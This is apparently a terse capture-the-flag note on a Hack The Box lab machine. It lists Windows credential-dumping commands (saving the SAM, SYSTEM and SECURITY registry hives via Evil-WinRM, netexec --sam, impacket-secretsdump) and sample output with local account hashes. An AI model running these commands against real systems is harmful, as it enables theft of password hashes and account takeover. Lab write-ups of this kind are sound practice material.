
V: is ~/boxes/htb/cicada
`*Evil-WinRM* PS V:\> reg save HKLM\SAM sam.hive`
`*Evil-WinRM* PS V:\> reg save HKLM\SYSTEM system.hive`
`*Evil-WinRM* PS V:\> reg save HKLM\SECURITY security.hive`

`nxc smb 10.10.10.10 ... --sam`

`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`

### Examples

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

